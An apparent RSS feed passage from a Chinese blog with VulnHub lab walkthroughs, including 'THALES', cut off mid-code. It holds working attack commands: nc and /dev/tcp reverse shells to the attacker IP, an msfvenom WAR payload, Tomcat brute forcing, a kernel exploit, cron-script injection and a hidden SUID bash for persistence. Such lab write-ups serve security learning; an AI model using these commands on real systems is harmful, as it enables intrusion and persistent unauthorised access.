&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-405.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到了网站权限&lt;/p&gt;
&lt;h3 id=&#34;蚁剑突破网站权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#蚁剑突破网站权限&#34;&gt;#&lt;/a&gt; 蚁剑突破网站权限&lt;/h3&gt;
&lt;p&gt;通过蚁剑连接到一句话后门的网站&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9hdHRhY2sucGhw&#34;&gt;http://192.168.31.27/site/attack.php&lt;/span&gt; 密码就是 attack.php 文件中的 x&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-406.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;测试连接成功，可以用来连接网站，尔后可以看到服务器上所有的文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-407.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;新建一个 1.php，用来通过php来系统命令反弹shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php system(&amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;4444&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/tmp/f&lt;span class=&#34;string&#34;&gt;&amp;quot;);?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-408.png&#34;&gt;
&lt;p&gt;写入文件成功了，但是没有被执行，并且查看文件发现是空的&lt;/p&gt;
&lt;p&gt;view-source:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS8xLnBocA==&#34;&gt;http://192.168.31.27/site/1.php&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-409.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-410.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;换了多个端口都失败了，最后查阅资料，发现服务器关闭了除 443 以外的端口，监听 443 端口，访问 url 地址，将命令执行等待反弹，访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS8xLnBocA==&#34;&gt;http://192.168.31.27/site/1.php&lt;/span&gt; 时，命令被执行，shell 成功反弹&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-411.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到服务器权限&lt;/p&gt;
&lt;h3 id=&#34;翻阅文件突破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#翻阅文件突破&#34;&gt;#&lt;/a&gt; 翻阅文件突破&lt;/h3&gt;
&lt;p&gt;翻阅网站文件，找到数据库配置文件 config.php，有用户名和密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-412.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; /var/www/html/site/wordpress/config.php desafio02:abygurl69&lt;/p&gt;
&lt;p&gt;找到一个网站的备份文件，同样有一个用户名和密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-413.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; /var/www/html/.backup jangow01:abygurl69&lt;/p&gt;
&lt;p&gt;尝试用户名密码登陆，通过 jangow01:abygurl69 登陆成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-414.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 获取到 jangow01 权限&lt;/p&gt;
&lt;h3 id=&#34;ftp-上传-exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-上传-exp&#34;&gt;#&lt;/a&gt; FTP 上传 EXP&lt;/h3&gt;
&lt;p&gt;服务器存在 s 权限的 pkexec，尝试 pkexec 提权，同时收集到服务器版本为 4.4.0-31 ubuntu&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-415.png&#34;&gt;
&lt;p&gt;提前准备好的 pkexec exp 在 kali 上，将其发送至靶机上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-416.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;kali 开启的 python 简易 web 服务器后无法下载，可能被限制了&lt;br&gt;
而且 ssh 服务并没有启动，用不了 scp 传输文件，并且 ping 不到 kali 机器上&lt;/p&gt;
&lt;p&gt;通过靶机上开放的 ftp 来传输文件，将 CVE-2021-4034 .zip 发送服务器上&lt;br&gt;
通过 jangow01:abygurl69 成功登陆到了 ftp 服务上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-417.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发送 CVE-2021-4034 文件时报错，显示不能发送文件夹&lt;/p&gt;
&lt;p&gt;因此改为了发送 CVE-2021-4034.zip 文件&lt;/p&gt;
&lt;p&gt;继续在反弹的 shell 上执行，当编译时，发现没有 make 命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-418.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权失败，需要通过其他的方式提权&lt;/p&gt;
&lt;h3 id=&#34;searchsploit-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#searchsploit-提权&#34;&gt;#&lt;/a&gt; searchsploit 提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;注意到服务器的版本是ubuntu 4.4.0的，用 searchsploit 寻找漏洞&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;searchsploit ubuntu 4.4.0- 31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;searshsploit -x linux/local/45010.c 找到payload的确切位置&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-419.png&#34;&gt;
&lt;p&gt;&lt;code&gt;cp /usr/share/exploitdb/exploits/linux/local/45010.c .&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-420.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 ftp 将内核漏洞权限提升的脚本上传，lcd 可以在 ftp 中用来切换本地的路径，cd 可以在 ftp 中用来切换所属 ftp 服务的主机的目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-421.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将上传的 45010.c文件编译运行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc 45010.c -o exp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x exp &amp;amp;&amp;amp; ./exp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-422.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权成功，拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/115%20THALES/</guid>
            <title>VULNHUB 15 THALES</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/115%20THALES/</link>
            <category>VULNHUB 11-20</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhhbGVzLTEsNzQ5Lw==&#34;&gt;https://www.vulnhub.com/entry/thales-1,749/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc4NDA1Ni9hcnRpY2xlL2RldGFpbHMvMTIzNTc3ODYy&#34;&gt;https://blog.csdn.net/weixin_43784056/article/details/123577862&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 THALES：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-307.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.109&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.109&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-308.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 8080&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 [&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5&#34;&gt;http://192.168.31.109&lt;/span&gt;](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5&#34;&gt;http://192.168.31.109&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-309.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;页面是一个普通的 tomcat 首页，没有直接可以点击的接口&lt;/p&gt;
&lt;p&gt;扫描目录  &lt;code&gt;dirsearch -u http://192.168.31.109:8080/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-310.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 对识别到的目录依次进行访问，找到了两个敏感目录&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5L21hbmFnZXIvaHRtbA==&#34;&gt;http://192.168.31.109/manager/html&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5L3NoZWxsLw==&#34;&gt;http://192.168.31.109/shell/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;换一个字典，重新扫描看是否有没有被找到的目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://192.168.31.109:8080 -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-311.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5L3NoZWxsLw==&#34;&gt;http://192.168.31.109/shell/&lt;/span&gt;&lt;br&gt;
 是一个不停转圈的网站，猜测是作者遗留在此的一个后门文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-312.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5L21hbmFnZXIvaHRtbA==&#34;&gt;http://192.168.31.109/manager/html&lt;/span&gt; 登陆界面，可进行爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-313.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;tomcat-弱口令爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tomcat-弱口令爆破&#34;&gt;#&lt;/a&gt; tomcat 弱口令爆破&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用msf对此登陆框进行弱口令尝试&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use auxiliary/scanner/http/tomcat_mgr_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set RHOSTS 192.168.31.109&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-314.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;较长时间后，获取到了正确的 tomcat 密码&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-315.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名：tomcat 密码：role1&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5OjgwODAvbWFuYWdlci9odG1s&#34;&gt;http://192.168.31.109:8080/manager/html&lt;/span&gt; 存在一个文件上传的漏洞，可用来上传 war 后门文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-316.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;war-后门文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#war-后门文件上传&#34;&gt;#&lt;/a&gt; War 后门文件上传&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用msf生成一个反弹shell的war文件木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.31.135 LPORT=4444 -f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;war -o revshell.war&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同时监听 4444 端口，等待 shell 的反弹&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-317.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;将 war 文件上传到 tomcat 上&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-318.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在网站上已经显示出了具体的 url 地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-319.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;点击此文件执行此反弹 shell 的代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-320.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到了服务器上的网站的权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-321.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
&lt;p&gt;查看 sudo -l 相关权限设置，查看是否有 s 权限设置错误&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-322.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看是否可以通过 pkexec 提权&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-323.png&#34; width=&#34;435&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;翻阅目录，查找敏感文件&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-324.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1ub3Rlcy12YjhqNjB6LnhuLS10eHRiYWNrdXAteDc1bm9vMjJmY2ExaDMwNHFkYzBiZ2RnZ2EzNDRlZTk1aC5zaA==&#34;&gt;根据 notes.txt 文件提示有一个备份文件 backup.sh&lt;/span&gt;，查看文件权限，发现所有者和组都是 root，所以应该是以 root 的身份在后台运行&lt;/p&gt;
&lt;p&gt;-&amp;gt; 可以使用 pspy64 脚本查看一下&lt;/p&gt;
&lt;h3 id=&#34;pspy64-监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pspy64-监控&#34;&gt;#&lt;/a&gt; pspy64 监控&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/DominicBreuker/pspy/archive/refs/heads/master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget 192.168.31.135/pspy64s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pspy64s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-325.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 pspy 监视正在运行的进程，发现有 UID=0 执行的程序，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2JhY2t1cC5zaA==&#34;&gt;backup.sh&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-326.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可以将反弹root终端的代码插入到backup.sh中，监听相应端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看文件的最后两行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tail -n 2 /usr/local/bin/backup.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-327.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;等待 shell 被反弹&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-328.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
&lt;p&gt;查看一下计划任务&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看定时任务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;crontab -l &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现是 5 分钟备份一次&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*/5 * * * * bash /usr/local/bin/backup.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;suid-权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-权限维持&#34;&gt;#&lt;/a&gt; SUID 权限维持&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;新增用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd kali &amp;amp;&amp;amp; passwd kali&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;新增SUID文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp /bin/bash /var/.hack &amp;amp;&amp;amp; chmod 4755 /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span 